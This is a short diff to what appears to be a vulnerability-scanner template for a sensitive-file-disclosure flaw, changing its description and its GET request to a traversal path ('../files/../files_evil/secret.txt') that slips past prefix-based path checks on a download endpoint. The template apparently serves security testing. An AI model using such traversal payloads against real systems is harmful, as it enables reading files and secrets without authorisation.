@@ -4,12 +4,12 @@ info:
   name: Sensitive file disclosure via insecure path validation
   author: vignesh
   severity: high
-  description: Application allows reading files outside the intended directory, exposing sensitive file contents
+  description: Application allows reading files outside the intended directory due to flawed prefix-based path validation
 
 requests:
   - method: GET
     path:
-      - "http://172.31.138.39:8002/download?file=../files_evil/secret.txt"
+      - "http://172.31.138.39:8002/download?file=../files/../files_evil/secret.txt"
 
     matchers:
       - type: word
